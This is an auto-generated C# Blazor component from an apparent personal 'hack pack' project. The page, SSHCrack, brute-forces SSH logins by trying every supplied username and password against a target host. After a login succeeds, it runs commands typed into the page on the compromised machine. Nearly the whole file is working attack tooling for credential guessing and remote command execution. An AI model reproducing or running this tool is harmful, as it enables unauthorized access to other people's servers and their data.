// <auto-generated/>
#pragma warning disable 1591
#pragma warning disable 0414
#pragma warning disable 0649
#pragma warning disable 0169

namespace JoshesHackPackServer.Pages
{
    #line hidden
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Threading.Tasks;
    using Microsoft.AspNetCore.Components;
#nullable restore
#line 1 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\_Imports.razor"
using System.Net.Http;

#line default
#line hidden
#nullable disable
#nullable restore
#line 2 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\_Imports.razor"
using Microsoft.AspNetCore.Authorization;

#line default
#line hidden
#nullable disable
#nullable restore
#line 3 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\_Imports.razor"
using Microsoft.AspNetCore.Components.Authorization;

#line default
#line hidden
#nullable disable
#nullable restore
#line 4 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\_Imports.razor"
using Microsoft.AspNetCore.Components.Forms;

#line default
#line hidden
#nullable disable
#nullable restore
#line 5 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\_Imports.razor"
using Microsoft.AspNetCore.Components.Routing;

#line default
#line hidden
#nullable disable
#nullable restore
#line 6 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\_Imports.razor"
using Microsoft.AspNetCore.Components.Web;

#line default
#line hidden
#nullable disable
#nullable restore
#line 7 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\_Imports.razor"
using Microsoft.JSInterop;

#line default
#line hidden
#nullable disable
#nullable restore
#line 8 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\_Imports.razor"
using JoshesHackPackServer;

#line default
#line hidden
#nullable disable
#nullable restore
#line 9 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\_Imports.razor"
using JoshesHackPackServer.Shared;

#line default
#line hidden
#nullable disable
#nullable restore
#line 2 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\Pages\SSHCrack.razor"
using HackLibrary;

#line default
#line hidden
#nullable disable
#nullable restore
#line 3 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\Pages\SSHCrack.razor"
using SshNet;

#line default
#line hidden
#nullable disable
    [Microsoft.AspNetCore.Components.RouteAttribute("/ssh")]
    public partial class SSHCrack : Microsoft.AspNetCore.Components.ComponentBase
    {
        #pragma warning disable 1998
        protected override void BuildRenderTree(Microsoft.AspNetCore.Components.Rendering.RenderTreeBuilder __builder)
        {
        }
        #pragma warning restore 1998
#nullable restore
#line 47 "C:\Users\joshi\source\repos\JoshesHackPackServer\JoshesHackPackServer\Pages\SSHCrack.razor"
       
    private string passwords;
    private string users;

    private string host;
    private string command;

    private string log = "";

    private bool readOnly = true;

    int logLen = 0;
    Renci.SshNet.SshClient found_client;

    private void AttemptConnection()
    {
        HackLibrary.SSHCrack.SetUsersFromString(users);
        HackLibrary.SSHCrack.SetPasswordsFromString(passwords);
        HackLibrary.SSHCrack.Host = host;
        foreach (string user in HackLibrary.SSHCrack.users)
        {
            log += $"Connecting to {user}@{host}:\n";
            foreach (string pass in HackLibrary.SSHCrack.passwords)
            {
                log += $"Trying {user}:{pass}\n";
                Renci.SshNet.SshClient client = new Renci.SshNet.SshClient(host, user, pass);
                if (client != null)
                {
                    try
                    {
                        client.Connect();

                        if (client.IsConnected)
                        {
                            found_client = client;
                            log += $"Success!\n{found_client.ConnectionInfo.Username} >> ";
                            readOnly = false;
                            logLen = log.Length;
                            return;

                        }
                    }
                    catch
                    {
                        log += $"Failed.\n";
                    }
                }
            }
        }
    }
    public void Enter(KeyboardEventArgs e)
    {
        if (e.Code == "Enter" || e.Code == "NumpadEnter" && found_client.IsConnected && command.Length > 0)
        {
            int addAfter = log.Substring(logLen).Length;
            log += $"{command}\n" + found_client.RunCommand(command).Result + $"{found_client.ConnectionInfo.Username} >> ";
            command = "";
            logLen = log.Length;
        }
    }

#line default
#line hidden
#nullable disable
    }
}
#pragma warning restore 1591
